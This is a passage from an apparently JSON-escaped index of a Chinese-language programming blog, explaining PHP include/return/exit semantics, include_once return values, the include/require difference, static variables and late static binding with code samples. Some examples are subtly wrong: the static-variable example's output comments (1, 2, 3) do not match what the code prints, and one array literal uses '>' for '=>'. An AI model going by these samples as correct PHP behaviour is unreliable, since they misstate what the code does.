class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>要怎麼看錯誤碼，我以前這篇寫過<br><a href=\"https://malagege.github.io/blog/2018/08/09/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/\">linux 設定環境變數 | 程式狂想筆記</a></p>\n<blockquote>\n<p>\\$?是指令回傳錯誤碼</p>\n</blockquote>\n<h2 id=\"有做-include-文件\"><a href=\"#有做-include-文件\" class=\"headerlink\" title=\"有做 include 文件\"></a>有做 include 文件</h2><blockquote>\n<p>如果在全局範圍中調用，則當前腳本文件中止運行。如果當前腳本文件是被 include 的或者 require 的，則控制交回調用文件。此外，如果當前腳本是被 include 的，則 return 的值會被當作 include 調用的返回值。如果在主腳本文件中調用 return，則腳本中止運行。如果當前腳本文件是在 php.ini 中的配置選項 auto_prepend_file 或者 auto_append_file 所指定的，則此腳本文件中止運行。</p>\n</blockquote>\n<p>我覺得先看範例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">\"b.php\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"a\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>b.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"b\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">return</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>(executing a.php:) will echo “ba”.</p>\n<p>whereas (b.php modified):</p>\n<p>a.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">\"b.php\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"a\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>b.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"b\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>(executing a.php:) will echo “b”.</p>\n<p><strong> 小心 global namespace </strong></p>\n<p>a.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'b.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>b.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">echo</span> <span class=\"string\">'foo'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Executing a.php will output “foo”.</p>\n<h3 id=\"include-和-return\"><a href=\"#include-和-return\" class=\"headerlink\" title=\"include 和 return\"></a>include 和 return</h3><p><a href=\"https://www.php.net/manual/zh/function.include.php\" target=\"_blank\" rel=\"noopener\">PHP: include - Manual</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span>.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$var = <span class=\"string\">'PHP'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> $var;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>noreturn.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$var = <span class=\"string\">'PHP'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>testreturns.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$foo = <span class=\"keyword\">include</span> <span class=\"string\">'return.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $foo; <span class=\"comment\">// prints 'PHP'</span></span><br><span class=\"line\"></span><br><span class=\"line\">$bar = <span class=\"keyword\">include</span> <span class=\"string\">'noreturn.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $bar; <span class=\"comment\">// prints 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>\\$bar 的值為 1 是因為 include 成功運行了。注意以上例子中的區別。第一個在被包含的文件中用了 return 而另一個沒有。如果文件不能被包含，則返回 FALSE 並發出一個 E_WARNING 警告。</p>\n</blockquote>\n<blockquote>\n<p>如果在包含文件中定義有函數，這些函數不管是在 return 之前還是之後定義的，都可以獨立在主文件中使用。如果文件被包含兩次，PHP 5 發出致命錯誤因為函數已經被定義，但是 PHP 4 不會對在 return 之後定義的函數報錯。推薦使用 include_once 而不是檢查文件是否已包含並在包含文件中有條件返回。</p>\n</blockquote>\n<h3 id=\"include-once-和-return\"><a href=\"#include-once-和-return\" class=\"headerlink\" title=\"include_once 和 return\"></a>include_once 和 return</h3><p><a href=\"https://www.php.net/manual/en/function.include-once.php\" target=\"_blank\" rel=\"noopener\">PHP: include_once - Manual</a><br>其實看範例很快就可以懂了<br>載入進去預設會為 True，假如文件有<code>return value</code>，include_once 就會回傳<br>但<code>include_once</code>第二次不會回傳東西</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">config.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">\"test\"</span>&gt;<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n<hr>\n<p>//first</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$config = <span class=\"keyword\">include_once</span>(<span class=\"string\">\"config.php\"</span>);</span><br><span class=\"line\">var_dump($config);</span><br><span class=\"line\"></span><br><span class=\"line\">$config = <span class=\"keyword\">include_once</span>(<span class=\"string\">\"config.php\"</span>);</span><br><span class=\"line\">var_dump($config);</span><br></pre></td></tr></table></figure>\n<hr>\n<p>output will be<br>array(<br>“test”=&gt;1,<br>)</p>\n<p>nothing</p>\n<h3 id=\"小記-include-和-require-差別\"><a href=\"#小記-include-和-require-差別\" class=\"headerlink\" title=\"小記 include 和 require 差別\"></a>小記 include 和 require 差別</h3><blockquote>\n<p>require 和 include 的不同 require 適合用來引入靜態的內容，而 include 則適合用來引入動態的程式碼。<br>include 在執行時，如果 include 進來的檔案發生錯誤的話，會顯示警告，不會立刻停止；<br>而 require 則是會顯示錯誤，立刻終止程式，不再往下執行。<br>include 可以用在迴圈；require 不行。</p>\n</blockquote>\n<p>參考來源: <a href=\"http://syunguo.blogspot.com/2013/04/phpinclude-require.html\" target=\"_blank\" rel=\"noopener\">Syun: [PHP]include 與 require 的差別</a></p>\n","categories":["PHP"],"tags":["return"]},{"title":"PHP - static那些事","url":"/blog/2019/02/20/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/","content":"<p>最近使用在看<code>static</code>部份<br>平常很少用，過很久可能就會忘了這是什麼東西<br>但 global 部份應該不再記錄<br><a href=\"https://malagege.github.io/blog/2019/01/28/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/\">PHP 有關參照(Reference)的那些事 | 程式狂想筆記</a><br>這裡面有簡單提到</p>\n<a id=\"more\"></a>\n<h2 id=\"static-用在變數\"><a href=\"#static-用在變數\" class=\"headerlink\" title=\"static 用在變數\"></a>static 用在變數</h2><p>static 通常是寫在 function 裡面<br>但寫在 function 外面也不會報錯</p>\n<p>一般沒有 static</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $a = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\">    $a++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(); <span class=\"comment\">//0</span></span><br><span class=\"line\">test(); <span class=\"comment\">//0</span></span><br><span class=\"line\">test(); <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>static 後</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> $a = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\">    $a++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(); <span class=\"comment\">//1</span></span><br><span class=\"line\">test(); <span class=\"comment\">//2</span></span><br><span class=\"line\">test(); <span class=\"comment\">//3</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"遞迴-function-static-變數\"><a href=\"#遞迴-function-static-變數\" class=\"headerlink\" title=\"遞迴 function static 變數\"></a>遞迴 function static 變數</h3><p>先看官網範例，可以用在遞迴，但後面注意<code>$count--</code>的關係<br>所以跑完<code>$count</code>變數會歸 0<br>但是沒有寫<code>$count--</code>不會</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> $count = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $count++;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $count;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($count &lt; <span class=\"number\">10</span>) &#123;</span><br><span class=\"line\">        test();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $count--;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">test(); <span class=\"comment\">// 12345678910</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\">test(); <span class=\"comment\">// 12345678910</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"定義-static-變數限制\"><a href=\"#定義-static-變數限制\" class=\"headerlink\" title=\"定義 static 變數限制\"></a>定義 static 變數限制</h3><p>簡單看官往範例，其實也滿好懂得<br>用運算式再次進入 function 怎麼知道初始值</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> $int = <span class=\"number\">0</span>;          <span class=\"comment\">// correct</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> $int = <span class=\"number\">1</span>+<span class=\"number\">2</span>;        <span class=\"comment\">// correct (as of PHP 5.6)</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> $int = sqrt(<span class=\"number\">121</span>);  <span class=\"comment\">// wrong  (as it is a function)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $int++;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $int;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>靜態聲明是在編譯時解析的。<br><a href=\"https://blog.csdn.net/risingsun001/article/details/22888861\" target=\"_blank\" rel=\"noopener\">深入理解 PHP 代码的执行的过程 - risingsun001 的专栏 - CSDN 博客</a><br>這一快我不是很了解</p>\n<h2 id=\"static-用在-Object-Function\"><a href=\"#static-用在-Object-Function\" class=\"headerlink\" title=\"static 用在 Object Function\"></a>static 用在 Object Function</h2><h3 id=\"self\"><a href=\"#self\" class=\"headerlink\" title=\"self\"></a>self</h3><p>這邊先介紹 Object 會用到的 self</p>\n<p>self:: 或者 __CLASS__，也可以用 get_class()呼叫<br>簡單說明一下，這邊跟 Java 的 this 很像<br>當是參照當前放置的 class 位置<br>可以看一下<a href=\"https://malagege.github.io/blog/2018/08/14/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/\">java method 類別成員(class member) 繼承踩雷 | 程式狂想筆記</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">self</span>::who();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">B::test();  <span class=\"comment\">#A</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"static\"><a href=\"#static\" class=\"headerlink\" title=\"static\"></a>static</h3><h2 id=\"Late-Static-Bindings-后期静态绑定\"><a href=\"#Late-Static-Bindings-后期静态绑定\" class=\"headerlink\" title=\"Late Static Bindings(后期静态绑定)\"></a>Late Static Bindings(后期静态绑定)</h2><p>static 跟 get_called_class()方法一樣，他是指實例後物件位置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span>::who(); <span class=\"comment\">// 后期静态绑定从这里开始</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">B::test(); <span class=\"comment\"># B</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 \\$this-&gt; 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。</p>\n</blockquote>\n<h3 id=\"在非靜態環境下使用-static\"><a href=\"#在非靜態環境下使用-static\" class=\"headerlink\" title=\"在非靜態環境下使用 static::\"></a>在非靜態環境下使用 static::</h3><blockquote>\n<p>Note:<br>在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 \\$this-&gt; 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。</p>\n</blockquote>\n<p>事後我在網路上找到了，更詳細解說<br><a href=\"https://blog.csdn.net/lamp_yang_3533/article/details/79912453\" target=\"_blank\" rel=\"noopener\">PHP 中 self、static、\\$this 的区别 &amp; 后期静态绑定详解 - 彳亍 - CSDN 博客</a><br><a href=\"/blog/2019/02/20/PHP-static那些事/1.png\" title=\"備份圖\">備份圖</a><br>老實說這篇寫很亂了 orz</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意事项</span><br><span class=\"line\">非静态环境下的私有方法的查找顺序</span><br><span class=\"line\"></span><br><span class=\"line\">在非静态环境下，在类的非静态方法中，使用 $this 和 static 调用类的私有方法时，执行方式有所不同。</span><br><span class=\"line\"></span><br><span class=\"line\">    $this 会优先寻找所在定义范围（父类）中的私有方法，如果存在就调用。</span><br><span class=\"line\">    static 是先到它指向的类（子类）中寻找私有方法，如果找到了就会报错，因为私有方法只能在它所定义的类内部调用；如果没找到，再去所在定义范围（父类）中寻找该私有方法，如果存在就调用。</span><br><span class=\"line\"></span><br><span class=\"line\">具体来说，$this 会先到所在定义范围内寻找私有方法，再到它指向的对象所属的类中寻找私有方法，然后寻找公有方法，最后到所在定义范围内寻找公共方法。只要找到了匹配的方法，就调用，并停止查找。</span><br><span class=\"line\"></span><br><span class=\"line\">而 static 则是先到它指向的类中寻找私有方法，再寻找共有方法；然后到所在定义范围内寻找私有方法，再寻找共有方法。只要找到了匹配的方法，就调用，并停止查找。</span><br><span class=\"line\">---------------------</span><br><span class=\"line\">作者：lamp_yang_3533</span><br><span class=\"line\">来源：CSDN</span><br><span class=\"line\">原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453</span><br><span class=\"line\">版权声明：本文为博主原创文章，转载请附上博文链接！</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"success!\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;foo();</span><br><span class=\"line\">        <span class=\"keyword\">static</span>::foo(); <span class=\"comment\">//** C實例呼叫的時候會有問題</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">/* foo() will be copied to B, hence its scope will still be A and</span></span><br><span class=\"line\"><span class=\"comment\">    * the call be successful */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">/* original method is replaced; the scope of the new one is C */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> B();</span><br><span class=\"line\">$b-&gt;test();</span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">$c-&gt;test();   <span class=\"comment\">//fails</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// success!</span></span><br><span class=\"line\"><span class=\"comment\">// success!</span></span><br><span class=\"line\"><span class=\"comment\">// success!</span></span><br><span class=\"line\"><span class=\"comment\">// &lt;br /&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to private method C::foo() from context 'A' in [...][...]:9</span></span><br><span class=\"line\"><span class=\"comment\">// Stack trace:</span></span><br><span class=\"line\"><span class=\"comment\">// #0 [...][...](27): A-&amp;gt;test()</span></span><br><span class=\"line\"><span class=\"comment\">// #1 &#123;main&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//   thrown in &lt;b&gt;[...][...]&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// PHP 5</span></span><br><span class=\"line\"><span class=\"comment\">// Fatal error:  Call to private method C::foo() from context 'A' in /tmp/test.php on line 9</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Late static bindings’ resolution will stop at a fully resolved static call with no fallback. On the other hand, static calls using keywords like parent:: or self:: will forward the calling information.</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span>::who();<span class=\"comment\">// (2) 遇到後期靜態綁定</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        A::foo();<span class=\"comment\">// 這不是轉發 (1)</span></span><br><span class=\"line\">        <span class=\"keyword\">parent</span>::foo();<span class=\"comment\">// 這是轉發 (1)</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>::foo();<span class=\"comment\">//   這是轉發 (1)</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span>::foo();<span class=\"comment\">// 這是轉發 (1)</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">B</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">C::test();</span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"comment\">// C</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span>::who();<span class=\"comment\">//</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span class=\"string\">\"\\n\"</span>;  <span class=\"comment\">//這個不是後期靜態綁定</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        A::who();<span class=\"comment\">// 這不是轉發</span></span><br><span class=\"line\">        <span class=\"keyword\">parent</span>::who();<span class=\"comment\">// 這是轉發</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>::who();<span class=\"comment\">// 這是轉發</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span>::who();<span class=\"comment\">// 這是轉發</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">who</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span>.<span 